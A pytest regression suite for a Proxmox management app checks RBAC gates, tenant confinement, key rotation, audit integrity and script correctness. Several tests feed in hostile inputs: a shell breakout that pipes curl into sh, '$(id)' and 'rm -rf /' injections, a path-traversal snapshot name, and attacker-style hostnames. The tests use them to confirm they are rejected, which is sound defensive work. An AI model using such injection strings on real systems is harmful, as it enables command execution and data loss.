"""Round-10 regression guards.

Every case here is a bug I introduced during this audit campaign, found by auditing my own
diff. The pattern in four of the five is the same: a gate that is correct for a CONFINED caller
applied unconditionally, so it also denies the unconfined operator whose job that route is.
The write gate and the read filter are not interchangeable — that lesson is now in three files.
"""
import time

import pegaprox.utils.rbac as rbac


def _pool_membership(cluster_id, mapping):
    data = {f"{vmid}:{vtype}": pool for vmid, (vtype, pool) in mapping.items()}
    with rbac._pool_cache_lock:
        rbac._pool_membership_cache[cluster_id] = {
            'data': data, 'timestamp': time.time(), 'refreshing': False}


def _cluster(api, cid='cluster_1'):
    m = api.make_fake_manager(cluster_id=cid)
    m.is_connected = True
    return api.set_manager(cid, m)


def _backup_mgr(api, job):
    import types
    m = _cluster(api)
    sess = m._create_session.return_value
    sess.get.return_value = types.SimpleNamespace(status_code=200, text='', json=lambda: {'data': job})
    sess.delete.return_value = types.SimpleNamespace(status_code=200, text='', json=lambda: {'data': None})
    return m


# ── R1: delete_backup_job reused the WRITE gate unconditionally ──────────────
def test_unconfined_tenant_admin_can_delete_the_clusterwide_backup_job(api, seed):
    # PVE creates an all=1 job by default. _authz_backup_targets rejects all=1 for anyone who
    # is not a global admin, so applying it unconditionally locked the owning tenant's admin
    # out of their own default job.
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('tadmin', role='user', tenant_id='acme',
                  permissions=['backup.delete', 'backup.view', 'cluster.view'])
    _backup_mgr(api, {'id': 'job-all', 'all': 1, 'schedule': 'daily'})
    r = api.as_user(u).delete('/api/clusters/cluster_1/datacenter/backup/job-all')
    assert r.status_code == 200, r.get_data(as_text=True)


def test_backup_operator_without_vm_backup_can_still_delete(api, seed):
    # the backup_operator template holds backup.delete but NOT vm.backup, so the per-VM loop
    # inside the write gate refused it every single job
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('bkop', role='user', tenant_id='acme',
                  permissions=['backup.delete', 'backup.view', 'cluster.view', 'vm.view'])
    _backup_mgr(api, {'id': 'job-1', 'vmid': '100', 'schedule': 'daily'})
    r = api.as_user(u).delete('/api/clusters/cluster_1/datacenter/backup/job-1')
    assert r.status_code == 200, r.get_data(as_text=True)


def test_scoped_caller_still_cannot_delete_a_foreign_backup_job(api, seed):
    # ...and the actual security property still holds
    seed.tenant('tenant_x', clusters=['cluster_1'])
    u = seed.user('mallory', role='viewer', tenant_id='tenant_x',
                  permissions=['backup.delete', 'cluster.view', 'vm.backup'])
    seed.pool('cluster_1', 'pool_1', 'mallory', ['pool.view', 'vm.view', 'vm.backup'])
    _pool_membership('cluster_1', {100: ('qemu', 'pool_1')})
    _backup_mgr(api, {'id': 'job-f', 'vmid': '200', 'schedule': 'daily'})
    assert api.as_user(u).delete(
        '/api/clusters/cluster_1/datacenter/backup/job-f').status_code == 403


# ── R2: update_tenant denied on key presence, and the form always sends it ───
def test_tenant_delegate_can_rename_while_resending_the_same_clusters(api, seed):
    # the edit form posts the whole object, clusters included — an unchanged list must not 403
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('gm', role='user', tenant_id='acme',
                  permissions=['admin.tenants', 'cluster.view'])
    r = api.as_user(u).put('/api/tenants/acme',
                           json={'name': 'Acme GmbH', 'clusters': ['cluster_1'],
                                 'quota_max_vms': 50})
    assert r.status_code == 200, r.get_data(as_text=True)


def test_tenant_delegate_still_cannot_actually_change_the_cluster_list(api, seed):
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('gm2', role='user', tenant_id='acme',
                  permissions=['admin.tenants', 'cluster.view'])
    r = api.as_user(u).put('/api/tenants/acme',
                           json={'name': 'Acme', 'clusters': ['cluster_1', 'cluster_secret']})
    assert r.status_code == 403, r.get_data(as_text=True)


# ── R3: the published effective_role collapsed a custom token role ───────────
def test_custom_token_role_keeps_its_name_in_the_session(api, seed, monkeypatch):
    from pegaprox.utils.auth import create_api_token
    import pegaprox.utils.rbac as rbacmod
    seed.tenant('acme', clusters=['cluster_1'])
    seed.user('owner', role='user', tenant_id='acme')
    monkeypatch.setattr(rbacmod, 'get_custom_roles',
                        lambda: {'global': {'readonly': {'permissions': ['vm.view', 'cluster.view']}},
                                 'tenants': {}})
    res = create_api_token('owner', 'ci', role='readonly')
    assert res.get('success'), res
    m = _cluster(api)
    m.last_migration_log = []
    seen = {}
    from pegaprox.api import clusters as clusters_mod
    orig = clusters_mod.check_cluster_access

    def _spy(cid):
        from flask import request
        seen['eff'] = request.session.get('effective_role')
        return orig(cid)

    clusters_mod.check_cluster_access = _spy
    try:
        api.anon().get('/api/clusters/cluster_1/migrations',
                       headers={'Authorization': f"Bearer {res['token']}"})
    finally:
        clusters_mod.check_cluster_access = orig
    # build_authz_user keeps the custom name; the session must agree with it, not collapse to viewer
    assert seen.get('eff') == 'readonly', seen


# ── R4: the secret sweep ate the token IDENTIFIER, not just the secret ───────
def test_backup_sweep_keeps_the_token_username():
    from pegaprox.api.settings import _strip_secret_fields
    c = {'id': 'c1', 'host': 'h', 'api_token_user': 'root@pam!pegaprox',
         'api_token_secret': 'SECRET', 'pass': 'ROOTPW'}
    _strip_secret_fields(c)
    assert c['api_token_user'] == 'root@pam!pegaprox', "the token username is not a secret"
    assert 'api_token_secret' not in c and 'pass' not in c, c


# ── R5: the force-check filter keyed on a field nothing writes ───────────────
def test_force_check_filter_resolves_the_cluster_from_the_config(api, seed, monkeypatch):
    # _record_eval snapshots ts/alert_id/reason/triggered/current_value — never 'cluster' —
    # so the first filter matched nothing and returned an empty map to every scoped caller
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('alertadmin', role='user', tenant_id='acme',
                  permissions=['alert.manage', 'cluster.view'])
    _cluster(api)
    import pegaprox.background.alerts as A
    monkeypatch.setattr(A, 'check_and_send_alerts', lambda: None)
    monkeypatch.setattr(A, 'load_alerts_config', lambda: {'alerts': [
        {'id': 'a-mine', 'cluster_id': 'cluster_1'},
        {'id': 'a-foreign', 'cluster_id': 'cluster_far'}]})
    monkeypatch.setattr(A, '_last_eval', {
        'a-mine': {'ts': 1, 'alert_id': 'a-mine', 'triggered': True},
        'a-foreign': {'ts': 1, 'alert_id': 'a-foreign', 'triggered': True}})
    body = api.as_user(u).post('/api/alerts/force-check').get_json()
    assert list(body['evaluations']) == ['a-mine'], body


# ── the round's sharpest NEW finding: <node> used as an SSH host ─────────────
def test_unknown_node_name_is_never_dialled_as_a_host(api, seed):
    """`_get_node_ip(node) or node` fell back to the caller's own string, so an unresolvable
    node name became the SSH target — and _ssh_connect presents the cluster's STORED
    credentials. Reachable at node.view, a builtin ROLE_USER and ROLE_VIEWER permission."""
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('viewer1', role='viewer', tenant_id='acme',
                  permissions=['node.view', 'cluster.view'])
    m = _cluster(api)
    m.nodes = {'n1': {'node': 'n1', 'status': 'online'}}
    m._get_node_ip.return_value = None          # not a member -> unresolvable
    # drive the real resolver rather than the fake's auto-attribute, which is truthy
    from pegaprox.core.manager import PegaProxManager
    m.member_node_ip.side_effect = lambda n: PegaProxManager.member_node_ip(m, n)
    called = []
    m._ssh_connect.side_effect = lambda host, *a, **k: called.append(host)
    api.as_user(u).get('/api/clusters/cluster_1/nodes/attacker.example.com/multipath')
    assert called == [], f"SSH was attempted against {called}"


def test_member_node_ip_refuses_a_non_member(api, seed):
    from unittest.mock import MagicMock
    from pegaprox.core.manager import PegaProxManager
    mgr = MagicMock(spec=PegaProxManager)
    mgr.nodes = {'n1': {}, 'n2': {}}
    mgr.logger = MagicMock()
    mgr._get_node_ip.return_value = '10.0.0.9'
    assert PegaProxManager.member_node_ip(mgr, 'evil.example.com') is None
    assert PegaProxManager.member_node_ip(mgr, '') is None
    assert PegaProxManager.member_node_ip(mgr, 'n1') == '10.0.0.9'


# ── a config value must never become code in a root-run agent script ────────
def test_ha_heartbeat_path_rejects_a_shell_breakout(api, seed):
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('haadmin', role='admin', tenant_id='acme')
    m = _cluster(api)
    m.ha_config = {}
    r = api.as_user(u).put('/api/clusters/cluster_1/ha/config',
                           json={'storage_heartbeat_path': '/mnt/x"; curl evil|sh; #'})
    assert r.status_code == 400, r.get_data(as_text=True)


def test_ha_heartbeat_path_accepts_normal_paths():
    # the route test above proves the guard is wired; this pins the accept/reject boundary
    # itself, so the guard cannot be tightened into rejecting real heartbeat paths
    import re
    ok = re.compile(r'/[A-Za-z0-9._@/+-]{0,255}')
    for good in ('/mnt/pve/shared-hb', '/srv/hb', '/mnt/pve/nfs-store/ha_heartbeat',
                 '/mnt/pve/store-01/hb.d', '/'):
        assert re.fullmatch(ok, good), good
    for bad in ('/mnt/x"; curl evil|sh; #', '/mnt/$(id)', '/mnt/`id`', 'relative/path',
                '/mnt/x\nrm -rf /'):
        assert not re.fullmatch(ok, bad), bad


# ── plugins: the fix was applied to one handler and its siblings were missed ──
def test_portal_handlers_build_a_floored_identity(api, seed):
    """_ct_create_options used build_authz_user with a comment explaining why; five siblings in
    the same file kept the raw load_users() lookup, so an admin-owned viewer token reached
    user_can_access_vm with its owner's admin role."""
    import re
    src = open('plugins/client_portal/__init__.py').read()
    # no handler may take its authz identity from a raw users-dict lookup any more
    assert not re.search(r'^\s+user = users\.get\(username', src, re.M), \
        "a portal handler still builds its identity from a raw load_users() record"


def test_plugin_admin_checks_use_the_effective_role():
    for p in ('plugins/status_page/__init__.py', 'plugins/notifications/__init__.py'):
        src = open(p).read()
        assert 'effective_role' in src, f"{p} still gates on the stored role"


# ── X-Forwarded-For: the leftmost hop is whatever the client sent ────────────
def test_client_ip_takes_the_rightmost_untrusted_hop(api):
    from pegaprox.utils.audit import get_client_ip
    import pegaprox.utils.audit as auditmod
    with api.app.test_request_context(
            '/', headers={'X-Forwarded-For': '1.2.3.4, 203.0.113.9'},
            environ_base={'REMOTE_ADDR': '127.0.0.1'}):
        # 127.0.0.1 is a trusted proxy, so the header is honoured — but the client-supplied
        # leftmost entry must not win the bucket key
        assert get_client_ip() == '203.0.113.9'


def test_client_ip_single_entry_still_works(api):
    from pegaprox.utils.audit import get_client_ip
    with api.app.test_request_context(
            '/', headers={'X-Forwarded-For': '203.0.113.9'},
            environ_base={'REMOTE_ADDR': '127.0.0.1'}):
        assert get_client_ip() == '203.0.113.9'


def test_client_ip_ignores_the_header_from_an_untrusted_peer(api):
    from pegaprox.utils.audit import get_client_ip
    with api.app.test_request_context(
            '/', headers={'X-Forwarded-For': '1.2.3.4'},
            environ_base={'REMOTE_ADDR': '198.51.100.7'}):
        assert get_client_ip() == '198.51.100.7'


# ── cross-cluster replication clones a guest to another cluster ──────────────
def test_cross_cluster_replication_gates_the_source_guest(api, seed):
    seed.tenant('tenant_x', clusters=['cluster_1', 'cluster_2'])
    u = seed.user('xrepl', role='viewer', tenant_id='tenant_x',
                  permissions=['cluster.config', 'cluster.view'])
    seed.pool('cluster_1', 'pool_1', 'xrepl', ['pool.view', 'vm.view'])
    _pool_membership('cluster_1', {100: ('qemu', 'pool_1')})
    _cluster(api, 'cluster_1')
    _cluster(api, 'cluster_2')
    r = api.as_user(u).post('/api/cross-cluster-replications',
                            json={'source_cluster': 'cluster_1', 'target_cluster': 'cluster_2',
                                  'vmid': 300, 'target_node': 'n1'})
    assert r.status_code == 403, r.get_data(as_text=True)


# ── V2P: the copy reported success after copying nothing ────────────────────
def test_v2p_parallel_copy_script_propagates_failure():
    """Each stream is a pipeline (ssh | dd) backgrounded with &, and the script used to end in
    a bare `wait` — which returns 0 no matter how the children exited. A disk that copied zero
    bytes was therefore reported as a completed migration. Assert the generated shape, and
    prove the shape itself by running it."""
    import subprocess
    src = open('pegaprox/core/v2p.py').read()
    assert '"set -o pipefail",' in src, "pipeline status is still masked"
    assert 'for p in $pids; do wait "$p" || rc=1; done' in src, "still waiting without status"
    assert "lines.append('exit $rc')" in src, "the script still cannot fail"

    # the old shape, for contrast
    old = subprocess.run(['bash', '-c', '( false | cat ) & ( false | cat ) & wait'],
                         capture_output=True)
    assert old.returncode == 0, "sanity: the old shape really did mask failure"

    new_fail = subprocess.run(['bash', '-c',
        'set -o pipefail; pids=""; ( false | cat ) & pids="$pids $!"; '
        '( false | cat ) & pids="$pids $!"; rc=0; '
        'for p in $pids; do wait "$p" || rc=1; done; exit $rc'], capture_output=True)
    assert new_fail.returncode == 1, "a failed stream must fail the script"

    new_ok = subprocess.run(['bash', '-c',
        'set -o pipefail; pids=""; ( true | cat ) & pids="$pids $!"; rc=0; '
        'for p in $pids; do wait "$p" || rc=1; done; exit $rc'], capture_output=True)
    assert new_ok.returncode == 0, "a clean run must still succeed"


def test_v2p_ssh_options_have_a_separator():
    """`"-o StrictHostKeyChecking=accept-new"` implicitly concatenated with the next line's
    `"-o ServerAliveInterval=..."` produced the literal option value `accept-new-o`, which ssh
    rejects with exit 255 — so these transfer paths could not connect at all."""
    src = open('pegaprox/core/v2p.py').read()
    assert 'accept-new"\n' not in src, "an ssh option string is still missing its separator"
    assert 'accept-new-o' not in src


def test_v2p_helper_scripts_are_not_world_readable():
    """The generated scripts embed SSHPASS=<esxi root password> and were created with the
    default umask, so the credential sat world-readable in /tmp on the Proxmox node for the
    whole transfer."""
    src = open('pegaprox/core/v2p.py').read()
    assert 'chmod +x {script}' not in src, "a helper script is still created world-readable"
    assert src.count('umask 077') >= 3


# ── RBAC core: the tenant-override branch dropped two things ────────────────
def test_tenant_override_still_honours_a_global_deny(api, seed):
    from pegaprox.utils.rbac import get_user_permissions
    u = {'role': 'user', 'tenant_id': 'acme',
         'denied_permissions': ['vm.delete'],
         'tenant_permissions': {'acme': {'role': 'admin'}}}
    perms = get_user_permissions(u, 'acme')
    assert 'vm.delete' not in perms, "a tenant override silently un-denied a global deny"


def test_token_role_caps_a_tenant_override(api, seed):
    # an admin-owned viewer-scoped token whose OWNER has a tenant admin override must not
    # inherit that override — the tenant branch never looked at effective_role
    from pegaprox.utils.rbac import get_user_permissions
    u = {'role': 'admin', 'effective_role': 'viewer', 'tenant_id': 'acme',
         'tenant_permissions': {'acme': {'role': 'admin'}}}
    perms = get_user_permissions(u, 'acme')
    assert 'vm.delete' not in perms and 'admin.users' not in perms, perms
    assert 'vm.view' in perms, "the viewer floor must still grant viewer rights"


def test_a_plain_session_with_a_tenant_override_is_unchanged(api, seed):
    from pegaprox.utils.rbac import get_user_permissions
    u = {'role': 'user', 'tenant_id': 'acme',
         'tenant_permissions': {'acme': {'role': 'admin'}}}
    perms = get_user_permissions(u, 'acme')
    assert 'admin.users' in perms, "no effective_role means no cap — session auth unaffected"


# ── scheduled tasks silently never executed ────────────────────────────────
def test_scheduled_task_survives_a_save_load_round_trip(db):
    """The executor dispatches on action/target_*, and the scheduler on schedule_type/_time/
    _day. None of them survived the round trip, so after any restart every task loaded with
    empty values, did nothing, and still logged 'Executing scheduled task'."""
    from pegaprox.background.scheduler import save_scheduled_tasks, load_scheduled_tasks
    original = {'tasks': [{
        'id': 't1', 'cluster_id': 'cluster_1', 'name': 'nightly stop',
        'action': 'stop', 'target_type': 'vm', 'target_id': '100', 'target_node': 'n1',
        'schedule_type': 'weekly', 'schedule_time': '23:30', 'schedule_day': 3,
        'enabled': True, 'config': {'foo': 'bar'},
    }]}
    save_scheduled_tasks(original)
    back = load_scheduled_tasks()['tasks'][0]
    for k in ('action', 'target_type', 'target_id', 'target_node',
              'schedule_type', 'schedule_time', 'schedule_day'):
        assert back.get(k) == original['tasks'][0][k], f"{k} lost: {back.get(k)!r}"
    assert back['config'] == {'foo': 'bar'}


def test_legacy_scheduled_rows_still_load(db):
    # rows written before the fix hold the bare config dict and the action in task_type
    import json
    from pegaprox.background.scheduler import load_scheduled_tasks
    db.conn.execute(
        "INSERT INTO scheduled_tasks (id, cluster_id, name, task_type, schedule, config, "
        "enabled, created_at) VALUES ('old1','cluster_1','legacy','stop',?,?,1,'2026-01-01')",
        (json.dumps({'schedule_type': 'daily', 'schedule_time': '05:00', 'schedule_day': 0}),
         json.dumps({'foo': 'bar'})))
    db.conn.commit()
    row = [t for t in load_scheduled_tasks()['tasks'] if t['id'] == 'old1'][0]
    assert row['action'] == 'stop', "the legacy action must be recovered from task_type"
    assert row['schedule_time'] == '05:00'
    assert row['config'] == {'foo': 'bar'}


# ── key rotation is a compliance feature that bricked the install ────────────
def test_key_rotation_keeps_ha_settings_readable(db):
    """clusters.ha_settings has no _encrypted suffix but IS encrypted (save_cluster stores
    _encrypt(json.dumps(...)) and both read paths _decrypt it). The rotation loop keyed on the
    suffix and missed it, and _decrypt RAISES on a key mismatch — so rotating the key made
    get_all_clusters throw and every cluster vanish."""
    db.save_cluster('c-rot', {
        'name': 'rot', 'host': '10.0.0.1', 'user': 'root@pam', 'pass': 'pw',
        'ha_settings': {'storage_heartbeat_enabled': True, 'pegaprox_vmid': '101'},
    })
    assert db.get_cluster('c-rot')['ha_settings']['pegaprox_vmid'] == '101'
    res = db.rotate_encryption_key()
    assert not res.get('errors'), res
    after = db.get_cluster('c-rot')          # raises if ha_settings kept the old key
    assert after['ha_settings']['pegaprox_vmid'] == '101', after['ha_settings']
    assert after['pass'] == 'pw', "the other secrets must still round-trip too"


# ── revoking a cluster from a tenant did not revoke anything ────────────────
def test_removing_a_cluster_from_a_tenant_takes_effect_immediately(api, seed):
    """rbac.tenants_db is the cache get_user_clusters reads and was only ever populated,
    never invalidated — so a revoked cluster stayed reachable until the process restarted."""
    import pegaprox.utils.rbac as rbacmod
    seed.tenant('acme', clusters=['cluster_1', 'cluster_2'])
    admin = seed.user('rootinv', role='admin', tenant_id='acme')
    u = {'username': 'member', 'role': 'user', 'tenant_id': 'acme'}
    # warm the cache the way a real request would
    assert 'cluster_2' in (rbacmod.get_user_clusters(u) or [])
    api.as_user(admin).put('/api/tenants/acme',
                           json={'name': 'acme', 'clusters': ['cluster_1']})
    assert 'cluster_2' not in (rbacmod.get_user_clusters(u) or []), \
        "the revoked cluster is still reachable"


# ── the portal ISO handlers were permanently broken ─────────────────────────
def test_portal_iso_handlers_pass_a_user_dict():
    """user_can_access_vm takes the user DICT; both ISO handlers passed the username string,
    so its first user.get(...) raised AttributeError and the routes always 500'd."""
    src = open('plugins/client_portal/__init__.py').read()
    assert 'user_can_access_vm(username,' not in src, \
        "a portal handler still passes the username string where a dict belongs"


# ── a Proxmox pool grant must not widen into a linked ESXi server ───────────
def test_pool_grant_does_not_widen_into_esxi(api, seed):
    """The VMware tenant gate called get_user_clusters with the default include_pools=True, so
    a Proxmox pool grant on a cluster satisfied it — and the scope-wins guard below only
    confines callers holding a vmware:<id> ACL. A pool on one Proxmox cluster therefore reached
    every guest on any ESXi server linked to it."""
    from unittest.mock import MagicMock
    import pegaprox.globals as g
    from pegaprox.utils.rbac import user_can_access_vmware_vm
    seed.tenant('tenant_x', clusters=[])          # tenant owns NO cluster
    u = seed.user('poolonly', role='user', tenant_id='tenant_x',
                  permissions=['vmware.vm.view'])
    seed.pool('cluster_1', 'pool_1', 'poolonly', ['pool.view', 'vm.view'])
    _pool_membership('cluster_1', {100: ('qemu', 'pool_1')})
    vm = MagicMock()
    vm.linked_clusters = ['cluster_1']
    g.vmware_managers['esxi-x'] = vm
    try:
        assert user_can_access_vmware_vm(u, 'esxi-x', 'vm-999', 'vmware.vm.view') is False
    finally:
        g.vmware_managers.pop('esxi-x', None)


# ── auth handlers rewrote the whole user table from a stale snapshot ───────
def test_auth_handlers_write_a_single_row():
    """Each handler did users_db = load_users(); mutate one entry; save_users(users_db). Two
    concurrent requests each hold a snapshot from before the other's write, so the second save
    silently reverts the first."""
    src = open('pegaprox/api/auth.py').read()
    assert 'save_users(users_db)' not in src, \
        "an auth handler still rewrites the whole user table from its own snapshot"
    assert src.count('save_single_user(username, user)') >= 5


def test_save_single_user_persists_only_that_account(db, seed):
    from pegaprox.utils.auth import save_single_user, load_users
    seed.user('alice', role='user', tenant_id='default')
    seed.user('bob', role='user', tenant_id='default')
    a = load_users()['alice']
    a['display_name'] = 'Alice A'
    save_single_user('alice', a)
    after = load_users()
    assert after['alice']['display_name'] == 'Alice A'
    assert 'bob' in after, "the sibling account must be untouched"


# ── force-check fired every tenant's alerts on demand ───────────────────────
def test_force_check_does_not_fire_globally_for_a_delegate(api, seed, monkeypatch):
    """check_and_send_alerts() evaluates and SENDS every tenant's rules, and _alert_last_sent
    is the global cooldown map — so a delegated alert.manage holder could spam every other
    tenant's channels and wipe the cooldown that prevents repeats."""
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('alertdelegate', role='user', tenant_id='acme',
                  permissions=['alert.manage', 'cluster.view'])
    _cluster(api)
    import pegaprox.background.alerts as A
    fired = []
    monkeypatch.setattr(A, 'check_and_send_alerts', lambda: fired.append(1))
    monkeypatch.setattr(A, 'load_alerts_config', lambda: {'alerts': []})
    monkeypatch.setattr(A, '_last_eval', {})
    monkeypatch.setattr(A, '_alert_last_sent', {'someone-elses-alert': 12345})
    body = api.as_user(u).post('/api/alerts/force-check?reset_cooldown=1').get_json()
    assert fired == [], "a delegate triggered the global alert loop"
    assert A._alert_last_sent == {'someone-elses-alert': 12345}, "the global cooldown was cleared"
    assert body['forced'] is False


def test_force_check_still_works_for_a_global_admin(api, seed, monkeypatch):
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('rootfc', role='admin', tenant_id='acme')
    _cluster(api)
    import pegaprox.background.alerts as A
    fired = []
    monkeypatch.setattr(A, 'check_and_send_alerts', lambda: fired.append(1))
    monkeypatch.setattr(A, 'load_alerts_config', lambda: {'alerts': []})
    monkeypatch.setattr(A, '_last_eval', {})
    r = api.as_user(u).post('/api/alerts/force-check')
    assert r.status_code == 200 and fired == [1], (r.status_code, fired)


# ── the ESXi watch registry had no bound ───────────────────────────────────
def test_vmware_watch_registry_is_bounded(api, seed):
    """The detail push walks every entry every 5s and issues three ESXi calls per entry, and
    the key is a caller-supplied vm_id — so vmware.vm.view, a builtin viewer permission, could
    keep a worker thread busy indefinitely."""
    from unittest.mock import MagicMock
    import pegaprox.globals as g
    from pegaprox.background.broadcast import broadcast_resources_loop
    seed.tenant('acme', clusters=['cluster_1'])
    u = seed.user('watcher', role='viewer', tenant_id='acme', permissions=['vmware.vm.view'])
    vm = MagicMock()
    vm.linked_clusters = []
    g.vmware_managers['esxi-w'] = vm
    broadcast_resources_loop._vmw_watched = {}
    try:
        for i in range(400):
            api.as_user(u).post(f'/api/vmware/esxi-w/vms/vm-{i}/watch', json={})
        assert len(broadcast_resources_loop._vmw_watched) <= 200, \
            len(broadcast_resources_loop._vmw_watched)
    finally:
        g.vmware_managers.pop('esxi-w', None)
        broadcast_resources_loop._vmw_watched = {}


# ── the audit trail read as tampered after a key rotation ──────────────────
def test_audit_trail_survives_key_rotation(db):
    """_generate_audit_hmac signs with self.aes_key, so after a rotation every historical row
    verified against a key that no longer exists — on a feature offered FOR compliance, where
    an intact audit trail is the other half of the requirement. Rotation now verifies each row
    with the old key and re-signs with the new one, so a row that was ALREADY tampered stays
    unverifiable and is counted rather than laundered."""
    db.add_audit_entry('alice', 'user.login', 'logged in', '10.0.0.5', 'cluster_1', 'info')
    db.add_audit_entry('bob', 'vm.start', 'started 100', '10.0.0.6', 'cluster_1', 'info')
    rows = db.query('SELECT * FROM audit_log') or []
    assert rows and all(db._verify_audit_hmac(dict(r)) for r in rows), "baseline must verify"
    res = db.rotate_encryption_key()
    assert not res.get('errors'), res
    after = db.query('SELECT * FROM audit_log') or []
    bad = [dict(r)['action'] for r in after if not db._verify_audit_hmac(dict(r))]
    assert not bad, f"audit history reads as tampered after rotation: {bad}"
    assert res.get('audit_resigned', 0) >= 2, res


def test_a_tampered_audit_row_is_not_laundered_by_rotation(db):
    db.add_audit_entry('carol', 'vm.delete', 'deleted 999', '10.0.0.7', 'cluster_1', 'warning')
    row = (db.query('SELECT * FROM audit_log') or [])[0]
    db.conn.execute("UPDATE audit_log SET details = 'nothing happened' WHERE id = ?",
                    (dict(row)['id'],))
    db.conn.commit()
    res = db.rotate_encryption_key()
    assert res.get('audit_unverifiable', 0) >= 1, res
    after = (db.query('SELECT * FROM audit_log') or [])[0]
    assert not db._verify_audit_hmac(dict(after)), "a tampered row must stay detectable"


# ── round 11: two more of my own campaign regressions ──────────────────────
def test_portal_password_change_actually_writes(api, seed, monkeypatch):
    """The identity rewrite deleted the `users = load_users()` binding but left
    `save_users(users)` behind, so this route raised NameError: the hash was never written and
    the session revocation below it never ran."""
    import symtable
    src = open('plugins/client_portal/__init__.py').read()
    st = symtable.symtable(src, 'x', 'exec')
    fn = [f for f in st.get_children() if f.get_name() == '_change_password'][0]
    names = {s.get_name() for s in fn.get_symbols() if s.is_global() and not s.is_assigned()}
    assert 'users' not in names, "_change_password still references an unbound `users`"
    # strip comments first — this file's own commentary quotes the old call
    code = '\n'.join(l.split('#')[0] for l in src.split('\n'))
    assert 'save_users(users)' not in code


def test_portal_admin_checks_read_the_floored_role():
    src = open('plugins/client_portal/__init__.py').read()
    assert "user.get('role') == ROLE_ADMIN" not in src, \
        "a portal admin check still reads the stored role"


def test_custom_role_token_guard_sees_tenant_roles(seed, monkeypatch):
    """get_role_permissions_for_user only consults TENANT custom roles when given a tenant_id.
    The guard called it without one, so it fell through to the viewer fallback, _extra came out
    empty and every tenant custom role passed — the exact case it exists to catch."""
    from pegaprox.utils.auth import create_api_token
    import pegaprox.utils.rbac as rbacmod
    seed.tenant('acme', clusters=['cluster_1'])
    seed.user('tenantuser', role='user', tenant_id='acme')
    monkeypatch.setattr(rbacmod, 'get_custom_roles', lambda: {
        'global': {},
        'tenants': {'acme': {'superops': {'permissions': ['vm.delete', 'node.update',
                                                          'admin.settings']}}},
    })
    res = create_api_token('tenantuser', 'sneaky', role='superops')
    assert 'error' in res, res
    assert 'beyond your own role' in res['error'], res


def test_key_rotation_covers_server_settings_and_bmc_secrets(db):
    """Rotation only walked columns whose NAME ends in _encrypted, so the secrets living in
    server_settings — and BMC endpoint passwords — stayed on the old key. _decrypt raises, so
    after a rotation ldap_bind_password broke every LDAP login and smtp_password broke alert
    mail, silently, on a task run FOR compliance."""
    s = db.get_server_settings() or {}
    s['ldap_bind_password'] = db._encrypt('ldap-secret')
    s['smtp_password'] = db._encrypt('smtp-secret')
    db.save_server_settings(s)
    assert db._decrypt(db.get_server_settings()['ldap_bind_password']) == 'ldap-secret'
    res = db.rotate_encryption_key()
    assert not res.get('errors'), res
    after = db.get_server_settings()
    assert db._decrypt(after['ldap_bind_password']) == 'ldap-secret'
    assert db._decrypt(after['smtp_password']) == 'smtp-secret'


# ── round 11: asymmetries this campaign itself left behind ─────────────────
def test_portal_snapshot_name_cannot_traverse(api, seed):
    """The portal interpolated the snapshot name straight into the PVE API path while the gate
    above it validated only the vmid, so a name carrying dot-segments reached a DIFFERENT
    guest's endpoint."""
    src = open('plugins/client_portal/__init__.py').read()
    assert '_valid_snapshot_name' in src
    import re
    ok = lambda n: bool(n) and bool(re.fullmatch(r'[A-Za-z][A-Za-z0-9_-]{0,62}', str(n)))
    for good in ('daily', 'pre-upgrade', 'snap_1'):
        assert ok(good), good
    for bad in ('../../../../qemu/999/snapshot/x', 'a/b', '', '1snap', 'a b', 'x' * 70):
        assert not ok(bad), bad


def test_update_schedule_post_has_the_same_gate_as_its_delete_twin():
    """The sweep gave DELETE the confinement gate and missed the POST — the one that ARMS a
    cluster-wide evacuate-and-reboot."""
    src = open('pegaprox/api/schedules.py').read()
    post = src[src.index('def set_update_schedule('):src.index('def delete_update_schedule(')]
    assert 'require_unconfined' in post, "the POST twin is still ungated"


def test_cross_cluster_replication_delete_and_run_gate_the_guest():
    src = open('pegaprox/api/vms.py').read()
    for fn in ('def delete_cross_cluster_replication(', 'def run_cross_cluster_replication('):
        i = src.index(fn)
        body = src[i:i + 3000]
        assert 'user_can_access_vm' in body, f"{fn} still gates on cluster reach alone"


def test_parse_pve_error_is_imported_where_it_is_used():
    """Both uses sit on the error branch of the API-token rotation, so a PVE error became a
    NameError and the caller fell through to the destructive delete+recreate path."""
    import pegaprox.api.clusters as c
    assert hasattr(c, 'parse_pve_error')


# ── an already-open SSE stream outlived the account behind it ──────────────
def test_open_sse_stream_closes_when_the_account_is_disabled(api, seed, monkeypatch):
    """The stream captures its identity at connect and lives for hours. Revoking the TOKEN —
    which this campaign added — does nothing for a stream that is already open, so disabling or
    deleting an account left it receiving frames until the client hung up. The re-check rides
    on the keepalive tick; force that branch immediately rather than waiting 30s for it."""
    import queue as queue_module
    import pegaprox.api.realtime as rt

    seed.tenant('acme', clusters=['cluster_1'])
    admin = seed.user('rootsse2', role='admin', tenant_id='acme')
    u = seed.user('streamer', role='user', tenant_id='acme', permissions=['cluster.view'])
    tok = api.as_user(u).post('/api/sse/token').get_json()['token']

    class _AlwaysEmpty(queue_module.Queue):
        def get(self, *a, **kw):
            raise queue_module.Empty()

    monkeypatch.setattr(rt.queue_module, 'Queue', _AlwaysEmpty)
    with api.app.test_request_context(f'/api/sse/updates?token={tok}'):
        gen = iter(rt.sse_updates().response)
        assert 'connected' in next(gen)
        assert next(gen).startswith(':'), "a live account should get a keepalive"
        api.as_user(admin).put('/api/users/streamer', json={'enabled': False})
        try:
            next(gen)
            raise AssertionError("the stream kept running after the account was disabled")
        except StopIteration:
            pass


def test_sse_broadcast_does_not_hold_the_global_lock_across_authz():
    """The per-client filters do uncached DB work and this loop runs about once a second;
    holding sse_clients_lock across it serialises every connect and disconnect behind the
    slowest lookup. broadcast_update already snapshots-then-sends for the WebSocket path."""
    src = open('pegaprox/utils/realtime.py').read()
    i = src.index('def broadcast_sse(')
    _next = src.find('\ndef ', i + 10)
    body = src[i:_next if _next != -1 else len(src)]
    assert '_clients_snapshot = list(sse_clients.items())' in body
    # the lock block itself must contain nothing but the snapshot
